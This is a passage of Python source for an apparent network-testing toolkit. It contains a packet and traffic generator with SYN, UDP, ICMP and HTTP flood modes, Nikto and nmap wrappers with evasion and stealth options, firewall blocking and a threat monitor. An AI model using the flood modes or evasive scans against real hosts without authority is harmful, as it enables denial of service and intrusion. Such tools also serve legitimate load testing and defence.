        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_traffic_generator,
            args=(generator_id, generator, packet_rate, stop_event)
        )
        thread.daemon = True
        thread.start()
        
        self.generator_threads[generator_id] = thread
        self.active_generators[generator_id] = generator
        
        self.db.log_connection(
            local_ip=self._get_local_ip(),
            local_port=0,
            remote_ip=target_ip,
            remote_port=port or 0,
            protocol=traffic_type,
            status="initiated"
        )
        
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator, 
                               packet_rate: int, stop_event: threading.Event):
        """Run traffic generator in thread"""
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    
                    time.sleep(packet_interval)
                    
                except Exception as e:
                    logger.error(f"Traffic generation error: {e}")
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.end_time = datetime.datetime.now().isoformat()
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            
            self.db.log_traffic(generator)
            self._save_traffic_log(generator)
            
        except Exception as e:
            generator.status = "failed"
            generator.error = str(e)
            self.db.log_traffic(generator)
            logger.error(f"Traffic generator failed: {e}")
        
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        """Get generator function for traffic type"""
        generators = {
            TrafficType.ICMP: self._generate_icmp,
            TrafficType.TCP_SYN: self._generate_tcp_syn,
            TrafficType.TCP_ACK: self._generate_tcp_ack,
            TrafficType.TCP_CONNECT: self._generate_tcp_connect,
            TrafficType.UDP: self._generate_udp,
            TrafficType.HTTP_GET: self._generate_http_get,
            TrafficType.HTTP_POST: self._generate_http_post,
            TrafficType.HTTPS: self._generate_https,
            TrafficType.DNS: self._generate_dns,
            TrafficType.ARP: self._generate_arp,
            TrafficType.PING_FLOOD: self._generate_ping_flood,
            TrafficType.SYN_FLOOD: self._generate_syn_flood,
            TrafficType.UDP_FLOOD: self._generate_udp_flood,
            TrafficType.HTTP_FLOOD: self._generate_http_flood,
            TrafficType.MIXED: self._generate_mixed,
            TrafficType.RANDOM: self._generate_random
        }
        return generators.get(traffic_type, self._generate_icmp)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return self._generate_ping_socket(target_ip)
        
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"ICMP generation failed: {e}")
            return 0
    
    def _generate_ping_socket(self, target_ip: str) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            sequence = 1
            payload = b"Spyk3 Traffic Test"
            
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, sequence)
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, sequence)
            
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            
            return len(packet)
        except Exception as e:
            logger.error(f"Ping socket failed: {e}")
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"TCP SYN generation failed: {e}")
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"TCP ACK generation failed: {e}")
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Spyk3\r\n\r\n"
            sock.send(data.encode())
            
            try:
                response = sock.recv(4096)
            except:
                pass
            
            sock.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="tcp_connect",
                status="completed"
            )
            
            return len(data) + 40
        except Exception as e:
            logger.error(f"TCP connect failed: {e}")
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                data = b"Spyk3 UDP Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"Spyk3 UDP Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except Exception as e:
            logger.error(f"UDP generation failed: {e}")
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="http_get",
                status="completed"
            )
            
            return len(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n") + len(data) + 100
        except Exception as e:
            logger.error(f"HTTP GET failed: {e}")
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=spyk3"
            headers = {
                "User-Agent": "Spyk3",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(data))
            }
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="http_post",
                status="completed"
            )
            
            return len(data) + 200
        except Exception as e:
            logger.error(f"HTTP POST failed: {e}")
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="https",
                status="completed"
            )
            
            return len(data) + 300
        except Exception as e:
            logger.error(f"HTTPS failed: {e}")
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            answer_rrs = b'\x00\x00'
            authority_rrs = b'\x00\x00'
            additional_rrs = b'\x00\x00'
            
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            
            dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
            
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="dns",
                status="completed"
            )
            
            return len(dns_query) + 8
        except Exception as e:
            logger.error(f"DNS query failed: {e}")
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            local_mac = self._get_local_mac()
            
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            
            self.db.log_connection(
                local_ip="0.0.0.0",
                local_port=0,
                remote_ip=target_ip,
                remote_port=0,
                protocol="arp",
                status="request_sent"
            )
            
            return len(packet)
        except Exception as e:
            logger.error(f"ARP generation failed: {e}")
            return 0
    
    def _generate_ping_flood(self, target_ip: str, port: int) -> int:
        return self._generate_icmp(target_ip, port)
    
    def _generate_syn_flood(self, target_ip: str, port: int) -> int:
        return self._generate_tcp_syn(target_ip, port)
    
    def _generate_udp_flood(self, target_ip: str, port: int) -> int:
        return self._generate_udp(target_ip, port)
    
    def _generate_http_flood(self, target_ip: str, port: int) -> int:
        return self._generate_http_get(target_ip, port)
    
    def _generate_mixed(self, target_ip: str, port: int) -> int:
        generators = [
            self._generate_icmp,
            self._generate_tcp_syn,
            self._generate_udp,
            self._generate_http_get
        ]
        generator = random.choice(generators)
        return generator(target_ip, port)
    
    def _generate_random(self, target_ip: str, port: int) -> int:
        traffic_types = [
            TrafficType.ICMP,
            TrafficType.TCP_SYN,
            TrafficType.TCP_ACK,
            TrafficType.UDP,
            TrafficType.HTTP_GET
        ]
        traffic_type = random.choice(traffic_types)
        generator = self._get_generator_function(traffic_type)
        return generator(target_ip, port)
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _save_traffic_log(self, generator: TrafficGenerator):
        try:
            filename = f"traffic_{generator.target_ip}_{generator.traffic_type}_{int(time.time())}.json"
            filepath = os.path.join(TRAFFIC_LOGS_DIR, filename)
            
            log_data = {
                "generator": asdict(generator),
                "system_info": {
                    "hostname": socket.gethostname(),
                    "local_ip": self._get_local_ip()
                },
                "performance": {
                    "packets_per_second": generator.packets_sent / max(1, generator.duration),
                    "bytes_per_second": generator.bytes_sent / max(1, generator.duration),
                    "average_packet_size": generator.bytes_sent / max(1, generator.packets_sent)
                }
            }
            
            with open(filepath, 'w') as f:
                json.dump(log_data, f, indent=2)
                
        except Exception as e:
            logger.error(f"Failed to save traffic log: {e}")
    
    def stop_generation(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        
        return False
    
    def get_active_generators(self) -> List[Dict]:
        """Get list of active traffic generators"""
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id,
                "target_ip": generator.target_ip,
                "traffic_type": generator.traffic_type,
                "duration": generator.duration,
                "start_time": generator.start_time,
                "packets_sent": generator.packets_sent,
                "bytes_sent": generator.bytes_sent
            })
        return active
    
    def get_traffic_types_help(self) -> str:
        """Get help text for traffic types"""
        help_text = "Available Traffic Types:\n\n"
        
        help_text += "Basic Traffic:\n"
        help_text += "  icmp         - ICMP echo requests (ping)\n"
        help_text += "  tcp_syn      - TCP SYN packets (half-open)\n"
        help_text += "  tcp_ack      - TCP ACK packets\n"
        help_text += "  tcp_connect  - Full TCP connections\n"
        help_text += "  udp          - UDP packets\n"
        help_text += "  http_get     - HTTP GET requests\n"
        help_text += "  http_post    - HTTP POST requests\n"
        help_text += "  https        - HTTPS requests\n"
        help_text += "  dns          - DNS queries\n"
        
        if self.has_raw_socket_permission and self.scapy_available:
            help_text += "\nAdvanced Traffic (requires raw sockets):\n"
            help_text += "  arp          - ARP requests\n"
            help_text += "  ping_flood   - ICMP flood\n"
            help_text += "  syn_flood    - SYN flood\n"
            help_text += "  udp_flood    - UDP flood\n"
            help_text += "  http_flood   - HTTP flood\n"
            help_text += "  mixed        - Mixed traffic types\n"
            help_text += "  random       - Random traffic patterns\n"
        
        return help_text

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner integration"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = self._check_nikto()
    
    def _check_nikto(self) -> bool:
        """Check if Nikto is available"""
        nikto_path = shutil.which('nikto')
        if nikto_path:
            logger.info(f"Nikto found at: {nikto_path}")
            return True
        
        common_paths = [
            '/usr/bin/nikto',
            '/usr/local/bin/nikto',
            '/opt/nikto/nikto.pl',
            '/usr/share/nikto/nikto.pl',
            'C:\\Program Files\\nikto\\nikto.pl',
            'C:\\nikto\\nikto.pl'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                logger.info(f"Nikto found at: {path}")
                return True
        
        logger.warning("Nikto not found. Some features will be limited.")
        return False
    
    def scan(self, target: str, options: Dict = None) -> NiktoResult:
        """Run Nikto scan on target"""
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=0,
                output_file="",
                success=False,
                error="Nikto is not installed or not in PATH"
            )
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = self._build_nikto_command(target, output_file, options)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=options.get('timeout', 600),
                encoding='utf-8',
                errors='ignore'
            )
            
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_nikto_output(result.stdout, output_file)
            
            nikto_result = NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=vulnerabilities,
                scan_time=scan_time,
                output_file=output_file,
                success=result.returncode == 0
            )
            
            self.db.log_nikto_scan(nikto_result)
            
            self.db.log_performance(
                scan_speed=len(vulnerabilities) / max(1, scan_time),
                response_time=scan_time,
                packet_loss=0,
                bandwidth=0,
                connections_per_sec=0
            )
            
            return nikto_result
            
        except subprocess.TimeoutExpired:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error="Scan timed out"
            )
        except Exception as e:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error=str(e)
            )
    
    def _build_nikto_command(self, target: str, output_file: str, options: Dict) -> List[str]:
        """Build Nikto command with options"""
        nikto_cmd = self._get_nikto_command()
        
        cmd = [nikto_cmd, '-host', target]
        
        if target.startswith('https://') or options.get('ssl', False):
            cmd.append('-ssl')
        
        if 'port' in options:
            cmd.extend(['-port', str(options['port'])])
        elif target.startswith('https://'):
            cmd.extend(['-port', '443'])
        
        if 'tuning' in options:
            cmd.extend(['-Tuning', options['tuning']])
        else:
            cmd.extend(['-Tuning', '123456789'])
        
        cmd.extend(['-Format', 'json', '-o', output_file])
        
        if 'level' in options:
            cmd.extend(['-Level', str(options['level'])])
        
        if 'timeout' in options:
            cmd.extend(['-timeout', str(options['timeout'])])
        
        if 'evasion' in options:
            cmd.extend(['-evasion', str(options['evasion'])])
        
        if 'ids' in options:
            cmd.append('-ids')
        
        if 'mutate' in options:
            cmd.extend(['-mutate', str(options['mutate'])])
        
        if options.get('debug', False):
            cmd.append('-Debug')
        
        if options.get('verbose', False):
            cmd.append('-v')
        
        return cmd
    
    def _get_nikto_command(self) -> str:
        """Get the correct Nikto command/path"""
        nikto_path = shutil.which('nikto')
        if nikto_path:
            return nikto_path
        
        common_paths = [
            '/usr/bin/nikto',
            '/usr/local/bin/nikto',
            '/opt/nikto/nikto.pl',
            '/usr/share/nikto/nikto.pl'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return 'nikto'
    
    def _parse_nikto_output(self, output: str, json_file: str) -> List[Dict]:
        """Parse Nikto output and extract vulnerabilities"""
        vulnerabilities = []
        
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    if 'vulnerabilities' in data:
                        vulnerabilities = data['vulnerabilities']
                    elif isinstance(data, list):
                        vulnerabilities = data
            except:
                pass
        
        if not vulnerabilities:
            lines = output.split('\n')
            for line in lines:
                if '+ ' in line or '- ' in line or 'OSVDB' in line or 'CVE' in line:
                    vulnerability = {
                        'description': line.strip(),
                        'severity': self._determine_severity(line),
                        'timestamp': datetime.datetime.now().isoformat()
                    }
                    
                    cve_match = re.search(r'CVE-\d{4}-\d{4,7}', line)
                    if cve_match:
                        vulnerability['cve'] = cve_match.group()
                    
                    osvdb_match = re.search(r'OSVDB-\d+', line)
                    if osvdb_match:
                        vulnerability['osvdb'] = osvdb_match.group()
                    
                    vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    def _determine_severity(self, line: str) -> str:
        """Determine severity from Nikto output"""
        line_lower = line.lower()
        
        if any(word in line_lower for word in ['critical', 'severe', 'remote root', 'arbitrary code']):
            return Severity.CRITICAL
        elif any(word in line_lower for word in ['high', 'vulnerable', 'exploit', 'privilege']):
            return Severity.HIGH
        elif any(word in line_lower for word in ['medium', 'warning', 'exposed', 'information']):
            return Severity.MEDIUM
        else:
            return Severity.LOW
    
    def get_available_scan_types(self) -> List[str]:
        """Get available scan types"""
        return [
            "full", "ssl", "cgi", "sql", "xss", "file", "cmd", "info"
        ]
    
    def check_target_ssl(self, target: str) -> bool:
        """Check if target supports SSL"""
        try:
            if '://' in target:
                target = target.split('://')[1]
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, 443))
            sock.close()
            
            return result == 0
        except:
            return False

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools"""
    
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 300) -> CommandResult:
        """Execute shell command"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time,
                error=None if result.returncode == 0 else f"Exit code: {result.returncode}"
            )
            
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output=f"Command timed out after {timeout} seconds",
                execution_time=execution_time,
                error='Timeout'
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output='',
                execution_time=execution_time,
                error=str(e)
            )
    
    @staticmethod
    def ping(target: str, count: int = 4, size: int = 56, timeout: int = 1, 
             flood: bool = False, **kwargs) -> CommandResult:
        """Ping with advanced options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), '-l', str(size), '-w', str(timeout * 1000)]
                if flood:
                    cmd.append('-t')
            else:
                cmd = ['ping', '-c', str(count), '-s', str(size), '-W', str(timeout)]
                if flood:
                    cmd.append('-f')
            
            cmd.append(target)
            
            return NetworkTools.execute_command(cmd, timeout * count + 5)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30, no_dns: bool = True, **kwargs) -> CommandResult:
        """Traceroute with options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert']
                if no_dns:
                    cmd.append('-d')
                cmd.extend(['-h', str(max_hops)])
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1']
                    if no_dns:
                        cmd.append('-n')
                elif shutil.which('traceroute'):
                    cmd = ['traceroute']
                    if no_dns:
                        cmd.append('-n')
                    cmd.extend(['-m', str(max_hops)])
                elif shutil.which('tracepath'):
                    cmd = ['tracepath', '-m', str(max_hops)]
                else:
                    return CommandResult(
                        success=False,
                        output='No traceroute tool found',
                        execution_time=0,
                        error='No traceroute tool available'
                    )
            
            cmd.append(target)
            return NetworkTools.execute_command(cmd, timeout=60)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick", ports: str = None, **kwargs) -> CommandResult:
        """Nmap scan with options"""
        try:
            cmd = ['nmap']
            
            if scan_type == "quick":
                cmd.extend(['-T4', '-F'])
            elif scan_type == "quick_scan":
                cmd.extend(['-T4', '-F', '--max-rtt-timeout', '100ms', '--max-retries', '1'])
            elif scan_type == "comprehensive":
                cmd.extend(['-sS', '-sV', '-sC', '-A', '-O'])
            elif scan_type == "stealth":
                cmd.extend(['-sS', '-T2', '--max-parallelism', '100', '--scan-delay', '5s'])
            elif scan_type == "vulnerability":
                cmd.extend(['-sV', '--script', 'vuln'])
            elif scan_type == "full":
                cmd.extend(['-p-', '-T4'])
            elif scan_type == "udp":
                cmd.extend(['-sU', '-T4'])
            elif scan_type == "os_detection":
                cmd.extend(['-O', '--osscan-guess'])
            elif scan_type == "service_detection":
                cmd.extend(['-sV', '--version-intensity', '5'])
            elif scan_type == "web":
                cmd.extend(['-p', '80,443,8080,8443', '-sV', '--script', 'http-*'])
            
            if ports:
                if ports.isdigit():
                    cmd.extend(['-p', ports])
                else:
                    cmd.extend(['-p', ports])
            elif scan_type not in ["full"] and not any(x in cmd for x in ['-p']):
                cmd.extend(['-p', '1-1000'])
            
            if kwargs.get('no_ping'):
                cmd.append('-Pn')
            if kwargs.get('ipv6'):
                cmd.append('-6')
            
            cmd.append(target)
            
            return NetworkTools.execute_command(cmd, timeout=600)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def curl_request(url: str, method: str = "GET", **kwargs) -> CommandResult:
        """cURL request"""
        try:
            cmd = ['curl', '-s', '-X', method]
            
            if kwargs.get('timeout'):
                cmd.extend(['-m', str(kwargs['timeout'])])
            if kwargs.get('headers'):
                for key, value in kwargs['headers'].items():
                    cmd.extend(['-H', f'{key}: {value}'])
            if kwargs.get('data'):
                cmd.extend(['-d', kwargs['data']])
            if kwargs.get('insecure'):
                cmd.append('-k')
            if kwargs.get('verbose'):
                cmd.append('-v')
            
            cmd.extend(['-w', '\nTime: %{time_total}s\nCode: %{http_code}\nSize: %{size_download} bytes\n'])
            cmd.append(url)
            
            return NetworkTools.execute_command(cmd, timeout=kwargs.get('timeout', 30) + 5)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A')
                    }
            
            return {'success': False, 'ip': ip, 'error': 'Location lookup failed'}
                
        except Exception as e:
            return {'success': False, 'ip': ip, 'error': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> CommandResult:
        """WHOIS lookup"""
        if not WHOIS_AVAILABLE:
            return CommandResult(
                success=False,
                output='WHOIS not available',
                execution_time=0,
                error='Install python-whois package'
            )
        
        try:
            import whois
            start_time = time.time()
            result = whois.whois(target)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=True,
                output=str(result),
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> CommandResult:
        """DNS lookup"""
        try:
            cmd = ['dig', domain, record_type, '+short']
            return NetworkTools.execute_command(cmd, timeout=10)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        """Block IP using system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(
                        ['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                        check=True,
                        timeout=10
                    )
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(
                        ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                         f'name=Spyk3_Block_{ip}', 'dir=in', 'action=block',
                         f'remoteip={ip}'],
                        check=True,
                        timeout=10
                    )
                    return True
            return False
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        """Unblock IP from system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(
                        ['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                        check=True,
                        timeout=10
                    )
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(
                        ['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                         f'name=Spyk3_Block_{ip}'],
                        check=True,
                        timeout=10
                    )
                    return True
            return False
        except Exception as e:
            logger.error(f"Failed to unblock IP {ip}: {e}")
            return False
    
    @staticmethod
    def shorten_url(url: str) -> str:
        """Shorten URL using TinyURL"""
        if not SHORTENER_AVAILABLE:
            return url
        
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except Exception as e:
            logger.error(f"Failed to shorten URL: {e}")
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        """Generate QR code for URL"""
        if not QRCODE_AVAILABLE:
            return False
        
        try:
            import qrcode
            qr = qrcode.QRCode(
                version=1,
                box_size=10,
                border=5
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except Exception as e:
            logger.error(f"Failed to generate QR code: {e}")
            return False

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    """Network monitoring and threat detection"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.monitoring = False
        self.monitored_ips = set()
        self.thresholds = {
            'port_scan': self.config.get('monitoring', {}).get('port_scan_threshold', 10),
            'syn_flood': self.config.get('monitoring', {}).get('syn_flood_threshold', 100),
            'udp_flood': self.config.get('monitoring', {}).get('udp_flood_threshold', 500),
            'http_flood': self.config.get('monitoring', {}).get('http_flood_threshold', 200),
            'ddos': self.config.get('monitoring', {}).get('ddos_threshold', 1000)
        }
        self.threads = []
        self.auto_block = self.config.get('security', {}).get('auto_block', False)
        self.auto_block_threshold = self.config.get('security', {}).get('auto_block_threshold', 5)
        self.connection_tracker = {}
    
    def start_monitoring(self):
        """Start network monitoring"""
        if self.monitoring:
            return
        
        self.monitoring = True
        logger.info("Starting network monitoring...")
        
        managed = self.db.get_managed_ips()
        self.monitored_ips = {ip['ip_address'] for ip in managed if not ip.get('is_blocked', False)}
        
        self.threads = [
            threading.Thread(target=self._monitor_system, daemon=True),
            threading.Thread(target=self._monitor_threats, daemon=True),
            threading.Thread(target=self._monitor_connections, daemon=True),
            threading.Thread(target=self._monitor_performance, daemon=True)
        ]
        
        for thread in self.threads:
            thread.start()
        
        logger.info(f"Network monitoring started with {len(self.threads)} threads")
        logger.info(f"Auto-block is {'enabled' if self.auto_block else 'disabled'}")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads = []
        self.connection_tracker.clear()
        logger.info("Network monitoring stopped")
    
    def _monitor_system(self):
        """Monitor system metrics"""
        while self.monitoring:
            try:
                cpu = psutil.cpu_percent(interval=1)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                net = psutil.net_io_counters()
                connections = len(psutil.net_connections())
                
                if cpu > 90:
                    self._create_threat_alert(
                        threat_type="High CPU Usage",
                        source_ip="localhost",
                        severity="high",
                        description=f"CPU usage at {cpu}%",
                        action_taken="Logged"
                    )
                
                if mem.percent > 90:
                    self._create_threat_alert(
                        threat_type="High Memory Usage",
                        source_ip="localhost",
                        severity="high",
                        description=f"Memory usage at {mem.percent}%",
                        action_taken="Logged"
                    )
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"System monitor error: {e}")
                time.sleep(10)
    
    def _monitor_threats(self):
        """Monitor for threats"""
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                
                source_counts = {}
                for conn in connections:
                    if conn.raddr:
                        source_ip = conn.raddr.ip
                        source_counts[source_ip] = source_counts.get(source_ip, 0) + 1
                        
                        if source_ip not in self.connection_tracker:
                            self.connection_tracker[source_ip] = []
                        self.connection_tracker[source_ip].append(time.time())
                        
                        self.db.log_connection(
